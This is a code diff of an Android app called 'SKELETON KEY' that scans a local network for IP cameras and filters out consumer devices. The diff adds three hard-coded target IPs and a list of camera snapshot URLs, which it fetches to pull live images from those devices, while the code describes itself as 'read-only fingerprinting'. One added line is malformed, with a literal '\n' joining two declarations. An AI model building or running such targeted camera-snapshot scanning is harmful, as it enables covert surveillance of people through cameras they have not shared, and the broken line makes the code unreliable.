@@ -13,7 +13,7 @@ class MainActivity:Activity(){
  private lateinit var log:TextView; private lateinit var scan:Button
  private val pool=Executors.newFixedThreadPool(32); private val main=Handler(Looper.getMainLooper())
  private val excluded=setOf("192.168.1.35","192.168.1.118","192.168.1.237")
- private val ports=intArrayOf(80,443,554,8000,8080,8554,8888,9000,34567,37777,49152)
+ private val ports=intArrayOf(80,443,554,8000,8080,8554,8888,9000,34567,37777,49152)\n private val deepTargets=setOf("192.168.1.12","192.168.1.26","192.168.1.64")
  private val count=AtomicInteger()
  override fun onCreate(b:Bundle?){super.onCreate(b);val box=LinearLayout(this).apply{orientation=LinearLayout.VERTICAL;setPadding(28,28,28,28)}
  box.addView(TextView(this).apply{text="SKELETON KEY";textSize=28f;gravity=Gravity.CENTER})
@@ -29,11 +29,11 @@ class MainActivity:Activity(){
   if(554 in open||8554 in open)rtsp(ip,if(554 in open)554 else 8554)?.let{fp.add(it)}
   val joined=fp.joinToString(" ").lowercase();val consumer=listOf("chromecast","google tv","android tv","roku","webos","tizen","airplay","iphone","ipad").any{joined.contains(it)}
   if(consumer)return;count.incrementAndGet();line("\n"+ip);line("Services: "+open.joinToString(", "));fp.forEach{line(it)}
-  if(open.any{it in intArrayOf(8080,8888,9000,34567,37777,49152)})line("★ Priority fingerprint candidate"); if(open.containsAll(listOf(80,443,8000,49152))){line("★★ CAMERA-LIKE 80/443/8000/49152 TARGET");deepCameraProbe(ip,open)} else if(open.any{it in intArrayOf(8000,49152)}){deepCameraProbe(ip,open)}}
+  if(open.any{it in intArrayOf(8080,8888,9000,34567,37777,49152)})line("★ Priority fingerprint candidate"); if(ip in deepTargets){line("★★ TARGETED DEEP PROBE + SNAPSHOT SEARCH");deepCameraProbe(ip,open)} else if(open.containsAll(listOf(80,443,8000,49152))){line("★★ CAMERA-LIKE 80/443/8000/49152 TARGET");deepCameraProbe(ip,open)} else if(open.any{it in intArrayOf(8000,49152)}){deepCameraProbe(ip,open)}}
  private fun deepCameraProbe(ip:String,open:List<Int>){
   line("DEEP PROBE "+ip+" — read-only fingerprinting")
-  val paths=listOf("/","/onvif/device_service","/onvif/Device_service","/device_service","/ISAPI/System/deviceInfo","/System/deviceInfo","/doc/page/login.asp","/web/","/upnp/","/description.xml","/rootDesc.xml","/api/device","/api/device/info","/device/info","/system/info")
-  for(p in listOf(80,8000,49152))if(p in open)for(path in paths)deepHttp(ip,p,path)?.let{r->if(!r.contains("404 Not Found",true))line("DEEP "+p+" "+path+": "+r)}
+  val paths=listOf("/","/onvif/device_service","/onvif/Device_service","/device_service","/ISAPI/System/deviceInfo","/System/deviceInfo","/doc/page/login.asp","/web/","/upnp/","/description.xml","/rootDesc.xml","/api/device","/api/device/info","/device/info","/system/info","/snapshot.jpg","/snapshot.jpeg","/image.jpg","/jpg/image.jpg","/cgi-bin/snapshot.cgi","/cgi-bin/snapshot.cgi?channel=1","/cgi-bin/currentpic.cgi","/tmpfs/auto.jpg","/Streaming/channels/1/picture","/ISAPI/Streaming/channels/101/picture")
+  for(p in listOf(80,443,8000,8080,8888,9000,49152))if(p in open)for(path in paths)deepHttp(ip,p,path)?.let{r->if(!r.contains("404 Not Found",true))line("DEEP "+p+" "+path+": "+r)}
   for(p in listOf(8000,49152))if(p in open)rawBanner(ip,p)?.let{line("DEEP "+p+" BANNER: "+it)}
   if(554 in open)rtsp(ip,554)?.let{line("DEEP RTSP: "+it)}
  }
